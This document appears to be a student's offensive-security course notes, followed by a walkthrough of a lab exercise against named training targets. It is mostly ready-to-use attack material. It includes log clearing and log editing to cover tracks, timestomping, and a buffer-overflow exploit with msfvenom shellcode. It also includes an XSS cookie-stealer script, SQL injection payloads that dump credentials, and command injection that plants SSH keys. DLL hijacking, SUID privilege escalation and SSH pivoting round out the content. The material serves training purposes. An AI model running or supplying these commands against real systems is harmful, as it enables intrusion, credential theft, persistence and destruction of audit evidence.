HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
Run
RunOnce

#System usage
 
wmic
net
netstat


#DEMO: Audit Logging
 -> Show all audit category settings
auditpol /get /category:*
 -> What does the below command show?
auditpol /get /category:* | findstr /i "success failure"


##Important Microsoft Event IDs

4624/4625 -> Successful/failed login

4720 -> Account created

4672 -> Administrative user logged on

7045 -> Service created


#DEMO: Event Logging
Storage: c:\windows\system32\config\
File-Type: .evtx/.evt
-> wevtutil el
-> wmic ntevent where "logfile="<LOGNAME>" list full
-> Get-Eventlog -List


#DEMO: Additional Logging
Determine PS version (bunch of ways)
-> reg query hklm\software\microsoft\powershell\3\powershellengine\
-> powershell -command "$psversiontable"

Determine if logging is set (PowerShell and WMIC)
-> reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
-> reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
-> # 0 = no | 1 = errors | 2 = verbose

WMIC Log Storage
%systemroot%\system32\wbem\Logs\



#DEMO: Manipulating Logs and Files
Find Files and Alter File attributes
-> forfiles /P c:\windows\system32 /S /D +05/14/2019
-> wmic datafile where name='c:\\windows\\system32\\notepad.exe' get CreationDate, LastAccessed, LastModified
-> copy /b filename.ext +,,
-> $(Get-Item file.ext).lastaccesstime=$(date) |$(Get-Item test.txt).lastaccesstime=$(Get-Date "07/07/2004")

Clear Event Logs (produces logging!):
-> wevtutil clear-log Application
-> Clear-Eventlog -Log Application, System



## LINUX EXPLIOT


SUDO Gotchas!
Commands that can access the contents of other files
Commands that download files
Commands that execute other commands (i.e. editors)
Dangerous commands

sudo -l -> to see what commands you can run as sudo

Ways To Figure Out Init Type
ls -latr /proc/1/exe
stat /sbin/init
man init
init --version
ps 1


Auditing SystemV
ausearch: Pulls from audit.log

ausearch -p 22
ausearch -m USER_LOGIN -sv no
ausearch -ua edwards -ts yesterday -te now -i


SystemD
Utilzes journalctl

journalctl _TRANSPORT=audit
journalctl _TRANSPORT=audit | grep 603


Logs for Covering Tracks
Logs typically housed in /var/log & useful logs:

auth.log/secure
Logins/authentications

lastlog
Each users' last successful login time

btmp
Bad login attempts

sulog
Usage of SU command

utmp
Currently logged in users (W command)

wtmp
Permanent record on user on/off



Working With Logs
file /var/log/wtmp
find /var/log -type f -mmin -10 2> /dev/null
journalctl -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4



Reading Files
cat /var/log/auth.log | egrep -v "opened|closed"
awk '/opened/' /var/log/auth.log
last OR lastb OR lastlog
strings OR dd            # for data files
more /var/log/syslog
head/tail
Control your output with pipes | and more



Cleaning The Logs
Before we start cleaning, save the INODE!

Affect on the inode of using mv VS cp VS cat

Know what we are removing (Entry times? IP? Whole file? Etc.)



Cleaning The Logs (Basic)
Get rid of it

rm -rf /var/log/...
Clear It

cat /dev/null > /var/log/...
echo > /var/log/...




Cleaning The Logs (Precise)
Always work off a backup!

GREP (Remove)
egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2

SED (Replace)
cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log


Timestomp (Nix)
Easy with Nix vs Windows (Native change of Access & Modify times)

touch -c -t 201603051015 1.txt   # Explicit
touch -r 3.txt 1.txt    # Reference


Rsyslog
Newer Rsyslog references /etc/rsyslog.d/* for settings/rules

Older version only uses /etc/rsyslog.conf

Find out
grep "IncludeConfig" /etc/rsyslog.conf



Reading Rsyslog
Utilizes severity (priority) and facility levels

Rules filter out, and can use keyword or number
<facility>.<priority>


Rsyslog Examples
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*


=====steps=====

##SUDO##
 sudo -l

##SUID/SGID##
find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files
find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files
find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and SGID files

gtfobins


## "." in path ##
echo $PATH



Disclaimer: Don't close terminals while doing sockets. It can close ALL your sockets TIP: Sudo bash can change you into root. use it when possible SSHing using MS ssh -MS /tmp/jmp demo1@10.50.11.225 Explanation: /tmp/jmp is the name of the socket file, we are sshing to our jump box Grabbing ports Ping sweep - we don't know what boxes are up Use duckduckgo.com to brown down CIDR notation for i in {97..126}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done After open new terminal Setup dynamic port foward. Using the /tmp/jmp file. -O for options. ssh -S /tmp/jmp jmp -O forward -D 9050

Enumrate IPs and ports ss -ntlp: see if connection is still up Scan the network from the Box (Port Enumeration) proxychains nmap 10.208.50.42,61,200,203 Check the IP's and ports. Press enter again if it does nothing proxychains nc 10.208.50.42 <"ports"> Local port forward onto ports found ssh -S /tmp/jmp jmp -O forward -L 1112:10.208.50.42:80

Web Enumeration Browse to /robots.txt on google, proxychains nmap --script=http-enum 10.208.50.42 -p 80

On a website if you see "myfile=" that allows you to transfer around its directory with linux commands: myfile=../../../../../../etc/passwd myfile=../../../../../../etc/hosts

Create new MS (Master Socket) to hop onto the next machine ssh-ing to new target with creds using out local port connected to remote port jmp box: -> T1:10.208.50.42:22

    ssh -S /tmp/jmp jmp -O forward -L 1113:10.208.50.42:22
    ssh -MS /tmp/t1 <"creds">@localhost -p 1113
    (Run ping sweep again if needed)

    
    **Creating a new MS for ssh 2nd example:**
    ssh -S /tmp/jmp jmp -O forward -L 1122:10.208.50.42:22 
    ssh -MS /tmp/t1 <"creds">@127.0.0.1 -p 1122
Port forwarding through control socket. Creds are not needed because of the connection on we have to box that can see where are we forwarding to .100 not 170 2 ways: ssh -S /tmp/t1 t1 -O forward -D 9050 ssh -MS /tmp/t1 <"creds">@127.0.0.1 -p 1112 -D 9050 (Dynamic tunnel) Cross Site Scripting and SSH key gen Cookie stealer for XSS Cross scripting On a website do: <script>document.location="http://:/Cookie_Stealer1.php?username=" + document.cookie;</script>

From remote IP (IP you have access to), setup listener: nc -k -l <'ip of the LINOPS machine'>

SSH Key gen SSH key gen/generate your key (from linops): ssh-keygen -t rsa -b 4096 (press enter when prompted) On website or remote location (make .ssh directory on websites $HOME)

    ; mkdir /home/billybob/.ssh && echo done(Replace billybob with your user on whatever machine your on)

    ; ls -la /home/billybob && echo done( This is an example, look at their home directory ; ls -la /home/___)
Upload our key using cmd inject cat $HOME/.ssh/id_rsa.pub #FROM LINOPS

From wesbite: ; echo <paste whole .pub key> > /home/billybob/.ssh/authorized_keys ; cat /home/billybob/.ssh/authorized_keys

Make ssh for the -MS connection to port into Here we are using T1 which is the .50.42 ssh -S /tmp/demo demo -O forward -L 42072:10.208.50.42:2222 ssh -S /tmp/demo demo -O cancel -L 42072:10.208.50.42:2222 (cancel if needed) You don't need to do this step if you can already ssh into it

ssh into the new box using the key Make new master socket: ssh -MS /tmp/gump -i $HOME/.ssh/id_rsa www-data@localhost -p 42070

Make an ssh -MS connection to port Make a dynamic port to new Master socket ssh -S /tmp/gump gump -O forward -D 9050 (make sure your previous dyanmic tunnel is closed) Do any enumartion on here: proxychains nmap, nc

Make a new ssh tunnel ssh -S /tmp/NEW-S(gump) (random name) -O forward -L 42073:10.208.50.42:22

Exploit Development Static Analysis 1. file func 2. strings func | more Check to see if strcpy is there since it tells you theres buffer overflows, it will let you go do the next steps

Behavioral Analysis # run the file # chmod u+x function # ./func

Dyanmic Analysis Do this to see if the function accept triple gators or no gators: 1. ./func 
You can't use 'macro parameter character #' in math mode
$(echo "12345") ## allows us to pass 12345 as a parameter
2. ./func &lt;&lt;&lt;$(echo "12345") ## simulates user input Go into gdb: 3. gdb ./func 4. shell and exit to go back 5. file to check if there is a file, load a file by typing "file ./func" 6. info functions

Disassembly Inside gdb-peda: 1. disass main or pdisass main 2. pdisass getuserinput or disass getuserinput Disclaimer: use the one that functions and gives and output Find the red call text

Dynamic Analysis part 2 Fuzzing Do this in terminal: ./func <<<$(python linbuf.py) #Take out gators if it doesn't work find offset: offset = "A" * 100

Pinpoint or find EIP, using wiremask Brute Force method -Run script in gdb: run <<<$(python linbuf.py) #Take out gators if it doesn't work -Pintpoint or find EIP, by raising or decreasing the offset to get BBBB: offset = "A" * 62 (BBBB was found with an offset of 62) eip = "BBBB"

print(offset + eip)
2nd method - Overflow the process: -Use wiremask string length of 100: Comment out the offset = "A" * 62 -> replace the offset with: offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A" -> run this script in gdb: run <<<$(python linbuf.py)

find JMP ESP -> find EIP In GDB on the TARGETS MACHINE -shell(Go to Terminal) -> env - gdb ./func -Commnds: unset env LINES -> unset env COLUMNS -> show env -start -> step through program with "step" -info proc map (might need to "file ./func" then start and info proc map again)

Overflow the buffer (Manning's way) -shell(Go to Terminal) -> env - gdb ./func -Commnds: unset env LINES -> unset env COLUMNS -> show env - run $(python2.7 -c "print 'A' * sizeOverBuffer) - In this example you would put 63 for sizeOverBuffer -info proc map (might need to "file ./func" then start and info proc map again)

Goal: type step until you see [heap] and [stack]
Once Found Heap and Stack -find /b <1st addr after heap>,,0xff,0xe4

EXAMPLE: find /b 0xf7de1000,0xffffe0000,0xff,0xe4 (the first 2 will change, the last 2 will not, the first 1 is after the heap the second one is the last address)

-Copy first 5 addresses into your notes

-Add to script NOP and replace EIP
-convert to little endian f7 de 3b 59 > "\x59\x3b\xde\xf7"

Script should look like this:
offset = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
print(offset + eip + nop)
Create msfvenom On linops msfvenom -p linux/x86/exec CMD="whoami" -b "\x00\xfe\x20\x0a\xff" -f python #Change the CMD to whatever command you need

Copy the all payloads in python script:
buf =  b""
buf += b"\xdd\xc4\xd9\x74\x24\xf4\x5f\xbd\x89\x90\x3f\x8f"
buf += b"\x2b\xc9\xb1\x0b\x31\x6f\x19\x83\xc7\x04\x03\x6f"
buf += b"\x15\x6b\x65\x55\x84\x33\x1f\xf8\xfc\xab\x32\x9e"
buf += b"\x89\xcc\x25\x4f\xf9\x7a\xb6\xe7\xd2\x18\xdf\x99"
buf += b"\xa5\x3f\x4d\x8e\xb1\xbf\x72\x4e\xc9\xd7\x1d\x2f"
buf += b"\x58\x4e\xe2\xf8\xf1\x19\x03\xcb\x76"

print(offset + eip + nop + buf)
#from terminal: ./func <<<$(python linbuf.py) 
Put script onto other box If your task is on another box: SCP your python script from comrade and grab it from linops:

scp student@10.50.187.68:/home/student/Downloads/python.py . #do it on home directory
Run the python script: sudo /.hidden/inventory.exe <<<$(python ~/python.py)
SQL Injection Blind Injection (Identify vulnerable field) Audi 'OR 1='1 # (Usuaully used in username and passswods, Audi is the vunerable field, the # is sometimes needed to comment out the back)

    TIP: In the inspector field if you change the method to get your Audi 'OR 1='1 output different results. 
Identify the number of columns Audi 'UNION SELECT 1,2,3,4 # (The numbers represent how many columns you want to see, again the # key might sometimes be needed)

Golden Statement Audi 'UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #

Explanation: UNION SELECT column_name,column_name FROM database.table Craft Queries Examples: Audi 'UNION SELECT 1,2,table_schema,4,5 FROM information_schema.columns; #

Audi 'UNION SELECT 1,2,username,passwd,jump FROM session.userinfo; #

Audi 'UNION SELECT 1,2,id,name,pass FROM session.user; #

Audi 'UNION SELECT 1,2,plugin_name,4,5 FROM information_schema.all_plugins; #
Explanation: The DATABASE is from the first column and TABLES are in the last columns. The information you want is in the middle column <"infomation you want">,1,2 FROM database.table (Before the FROM you need to put the exact number of columns it wants ot else it won't work) SQL Injection GET Blind Injection (Identify Vulnerable Field) http://127.0.0.1:6767/uniondemo.php?Selection=1 OR 1=1 Change The Selection number to see which number is the vulnerable one It doesn't only have to be selection it can be named product or something else. Identify Number of Columns http://127.0.0.1:6767/uniondemo.php?Selection=2 UNION SELECT 1,2,3 Explanation: 2 was shown to be the vulnerable number and 1,2,3 are the number of columns shown. Golden Statement http://127.0.0.1:6767/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns Craft Queries http://127.0.0.1:6767/uniondemo.php?Selection=2 UNION SELECT column_name,column_name,column_name FROM database.table column_name is the information you want Example: http://127.0.0.1:7890/cases/productsCategory.php?category= UNION SELECT comment,data,id FROM sqlinjection.share4 Explanation: The DATABASE is from the first column and TABLES are in the last columns. The information you want is in the middle column <"infomation you want">,1,2 FROM database.table (Before the FROM you need to put the exact number of columns it wants ot else it won't work) Windows Privilege Escalation Static Analysis (use regedit) -> check in run keys for HKCU and HKLM -> Look for anything odd Services In your taskbar type services -> look for anything odd, to enumerate right click and press propterties -> common things to look for: In the description: anything empty If your in a suspicious directory click on view on the top and check mark the hidden files. System Access and Defeating Proctection Task Scheduler Look at triggers/actions (Can dig into directory that is set to run to upload/replace dlls or exe's) Audit logging CMD/PS commands: auditpol /get /category:* -> search for success/failure Specific command: auditpol /get /category:* | findstr /i "Success Failure" DLL Hijacking download putty.exe from resources procmon /accepteula Process monitor: Process name -> putty.exe path -> .dll reseult -> NAME NOT FOUND identify .dll to alter Run on linux: msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPOCLI.dll

Once created, SCP to your target machine (On the RDP machine) scp student@<'LIN OPS IP'>:/home/student/SSPICLI.dll C:\Users\student\Doucments\putty

Explanation: C:\Users\student\Desktop\whoami.txt is where you are sending the command you did to enumerate the .dll. You will need to scp it and restart your machine in order to see that file. DLLs are read at boot up thats why you need to restart Run putty again if you need too (This was for the demo you probably don't got to do it) To look for other DLL there is a registry key for that: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs Linux Privilege Escalation Permissions Sudo Permissions: sudo -l Look for User: may run following commands

SUID/SGID bits find / -type f -perm /4000 -ls 2>/dev/null # find SUID only files find / -type f -perm /2000 -ls 2>/dev/null # find SGID only files find / -type f -perm /6000 -ls 2>/dev/null # find SUID and/or SGID files

Go to GTFObins.org -> search for commands you found from the top commands 
-Start searching on sudo -l commands 
-If there are none, start with top/bottom 3 SUID/SGID commands 
-Once you find a command that has SUID/SGID bit set 
go back to GTFObins and find the command  listed under the respective tabs run the command
Dot "." in the path echo $PATH Identified the Path Variables

PATH = .:/sbin:/bin:/usr/bin:/usr/local/bin:/snap/bin OR
PATH = .:$PATH

The dot at the beginning is saying look at my current directory

cd `printf "/var/tmp\n/tmp\n" | sort -R | head -n 
1` ;ls 
RDP into another machine #from Op station specify local listening port on RHP (Random High Port): ssh student@<JMP_IP> -L RHP:10.10.28.45:3389

#from Op station point xfreerdp to new local listening tunnel:
xfreerdp /u:student /v:localhost:RHP /dynamic-resolution +clipboard
Example: ssh user2@10.50.18.4 -L 1115:192.168.28.189:3389 proxychains xfreerdp /u:Aaron /v:192.168.28.189 /dynamic-resolution +clipboard

Something cool mysql --user=webuser --pass=sqlpass




Tasking
All actions must be in accordance with mission brief, scope, and RoE.
Complete the taskings on each referenced target below.
Each heading is the hostname of a target. The first listed target’s hostname is “PublicFacingWebsite”.

PublicFacingWebsite
Perform Reconnaissance 
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors.
Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system.
    2. There are multiple ways to gain access, try to find all. 
Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
    3. Discover potential vulnerable binary to attempt exploitation and read sensitive file at “/root/secret_msg.txt”
Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
NOTES
    • 

BestWebApp
Perform Reconnaissance
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors. 
Attempt Exploitation
    1. Attempt to retrieve privileged information from the target by using information found in reconnaissance. Reconnaissance from other targets within the network may have information relevant to any target.
NOTES
    • 

RoundSensor
Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.
Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
NOTES
    • 

Windows-Workstation
Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.
Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
Pivot to Found Targets
    1. Pivot through network to other targets as you find them.
NOTES
    • 


#### Step 1 ####
--Port Scanning IP & enumerate--
nmap -p 80 --script=http-enum <IP address>    (Locates useful libraries that should be looked into)
                                      /login.php
                                      /login.html
                                      /img
                                      /scripts

#### Step 2 ####
--Employee Sign In using SQL Injection--    
bob' OR 1='1 (user & pass)

#cmd injection#
; find / -name "*.ssh"    (finds ssh keys or location to insert)  Private key is for yourself **PUBLIC KEY IS UPLOADED**
; ls -la     (lists everything in pwd that could be relevant)
; whoami     (reveals user logged in as)

#create/upload ssh key#
lin-ops#  ssh-keygen -t rsa
lin-ops#  cat /home/student/.ssh/id_rsa.pub
vulnerable#   mkdir /var/www/.ssh
vulnerable#   echo "public key" >> /var/www/.ssh/authorized_keys
vulnerable#   cat /var/ww/.ssh/authorized_keys


--URL on certain web links reveals vulnerability to inject--
URL/<IP address>/login.php?username=bob' OR 1='1&passwd=bob' OR 1='1    (Gather all contents into login.php)

--Upload link reveals that malicious injection could be used--
-------------------------------------------------------------------------------------------------------------------

#### Step 3 ####
-Create Master Socket-
-IP discovered in /etc/hosts-
-Enumerate discovered IP-
-Ping sweep with script-

lin-ops#  ssh -MS /tmp/jump user2@10.50.158.70
user2@public#  sudo -l
  ls /var/tmp
  ls /home
  ps -elf
  ls /etc/rsylog.d
  cat *
  uname -a   (for kernel version [4.15.0-213-generic])
  ls -la /var/www/html
  cat /var/ww/html/login.php   (could provide credentials)
  mysql --user-webuser --pass=sqlpass
  use session; 
  show tables;
  select * from session_log;
  select * from user;
  exit
  <ping sweep script>  (identify all IP in network)
                        192.168.28.165
                        192.168.28.175

lin-ops#  ssh -S /tmp/jump jump -O forward  -D9050
lin-ops#  proxychains nmap 192.168.28.175        192.168.28.165
                            port 2222, 8000        port 22, 8888
                                              
lin-ops#  ssh -S /tmp/jump jump -O forward -L1111:192.168.28.175:8000
-----------------------------------------------------------------------
127.0.0.1:1111
#SQL Injection#
product=1 or 1=1    (keep incrementing product #)
product=7 UNION SELECT 1,2,3    (identify amount of columns)
product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns    (Golden statement/Search for user created)
                                                    information_schema
                               DEFAULT DATABASES    mysql
                                                    performance_schema

product=7 UNION SELECT user_id,name,username FROM siteusers.users    (credentials located)

lin-ops#  ssh -S /tmp/jump jump -O forward -L2222:192.168.28.165:22
lin-ops#  ssh -MS /tmp/Round user3@127.0.0.1 -p 2222

lin-ops#  ssh -S /tmp/Round jump
$  shell
user3@Round#  sudo -l
  ls /var/tmp
  ps -elf
  cat /etc/crontab
  find / -type f -perm /6000 2>/dev/null -ls    (find vulnerable binaries)
  gtfobins  (input suspicious binaries to identify vulnerability) #FIND# #SUID#
  find . -exec /bin/sh -p \; -quit

# whoami    (root)
  ls -la /root
  cat ab.sh    (listening port found)
  cat RE_ME.obs    (reverse engineering)
      ---IN GHIDRA >> MEANS BIT SHIFT---
          bit shift calculator 
            right means left

# <ping sweep script>    (192.168.28.189 found)
--------------------------------------------------
lib-ops#  ssh -S /tmp/jump jump -O cancel -D 9050
lin-ops#  ssh -S /tmp/Round jump -O forward -D 9050
lin-ops#  proxychains nmap 192.168.28.189
                            ports 22, 135, 139, 445, 3389, 5357, 9999
lin-ops#  ssh -S /tmp/Round jump -O forward -L3333:192.168.28.189:22 -L4444:192.168.28.189:3389 
lin-ops#  ssh -MS /tmp/Winders Aaron@127.0.0.1 -p 3333
lin-ops#  ssh -S /tmp/Winders jump 

lin-ops#  xfreerdp /u:Aaron /v:localhost:4444 /dynamic-resolution +clipboard    (Add correct hostkey to filepath)


